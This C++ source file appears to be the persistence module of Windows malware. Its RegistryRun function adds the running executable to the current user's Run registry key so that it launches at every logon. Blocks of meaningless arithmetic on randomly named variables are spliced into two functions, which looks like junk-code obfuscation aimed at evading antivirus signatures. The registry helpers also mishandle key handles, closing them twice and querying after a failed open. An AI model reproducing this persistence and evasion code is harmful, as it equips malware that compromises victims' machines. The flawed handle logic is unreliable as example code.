#include "RegistryRun.h"

bool GetKeyData(HKEY hRootKey, LPCSTR subKey, LPCSTR value, LPDWORD lpType, LPBYTE data, DWORD *cbData)
{
	HKEY hKey;
	bool ret = true;
	if (RegOpenKeyExA(hRootKey, subKey, 0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS)
		ret = false;

	if (RegQueryValueExA(hKey, value, NULL, lpType, data, cbData) != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		ret = false;
	}

	RegCloseKey(hKey);
	return ret;
}

bool SetKeyData(HKEY hRootKey, LPCSTR subKey, DWORD dwType, LPCSTR value, LPBYTE data, DWORD cbData)
{
	HKEY hKey;
	bool ret = true;
	if (RegCreateKeyA(hRootKey, subKey, &hKey) != ERROR_SUCCESS)
		ret = false;

	if (RegSetValueExA(hKey, value, 0, dwType, data, cbData) != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
int iYA3D92IQk7;
int iqKMrxhKQ9e = 0x047c40d;
int is0gWR1ZqCU = 0xf64d9a5;
int izJ2I8wuJ6K = 0xd3c5891;
for(iYA3D92IQk7 = 0; iYA3D92IQk7 < 3; iYA3D92IQk7++)
{
    iqKMrxhKQ9e = iYA3D92IQk7 * 99 - 1000 * is0gWR1ZqCU + 0x456 ^ 0x915ac78 % 5 - 0x532f12b;
    is0gWR1ZqCU = iYA3D92IQk7 * 3 + izJ2I8wuJ6K + 0x30 + 0xd3c5891 % 123 - is0gWR1ZqCU;
    izJ2I8wuJ6K = iYA3D92IQk7 * 4 - 0xf64d9a5 + 0xff / 0x123 - 0xd3c5891 % 234 - 0x532f12b;
}
int il8AM9sww6D = izJ2I8wuJ6K - iqKMrxhKQ9e * is0gWR1ZqCU + 0xd3c5891;
il8AM9sww6D = iYA3D92IQk7 - 50 + 100 - 0xf64d9a5 ^ 99 * 0x0f - 0xd3c5891 % 2 - 3575 + 0x532f12b;

		ret = false;
	}

	RegCloseKey(hKey);
	return ret;
}

bool RegistryRun()
{
	char pathfile[MAX_PATH];
	GetModuleFileNameA(NULL, pathfile, MAX_PATH);
int iMXxrIuuEca = 0x126c11d;
int isD5QTvpJms = 0xec2eb5a;
int iKKMDztPQX1 = 0x6af7857;
int iaRSskofHt9 = iKKMDztPQX1 * isD5QTvpJms + iMXxrIuuEca;
isD5QTvpJms = 0x964760e - iaRSskofHt9 + 5 + 0xff3b459 + 69 - iMXxrIuuEca;
iMXxrIuuEca = 0x126c11d + 10 - isD5QTvpJms % 10 + 0x6af7857 + 999 - iaRSskofHt9;
iaRSskofHt9 = iMXxrIuuEca % 5 + iKKMDztPQX1 % 0xec2eb5a + 0xcafebabe + iMXxrIuuEca;
iKKMDztPQX1 = 0x126c11d * 0x100 - iMXxrIuuEca + 56 ^ 0xec2eb5a + 1996 - iKKMDztPQX1;
int iEO3IWkxsp9 = iKKMDztPQX1 / 77 + 0x6af7857 - 76 / iKKMDztPQX1 ^ 0x33 % iKKMDztPQX1 % 0x6af7857;
iEO3IWkxsp9 = 0xff3b459 * 0x10 - 22 + iEO3IWkxsp9 + 56 ^ 0xff + isD5QTvpJms + 1996 - 2111 + iKKMDztPQX1;

	char *filename = PathFindFileNameA(pathfile);
	return SetKeyData(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", REG_SZ, filename, (LPBYTE)pathfile, strlen(pathfile));
}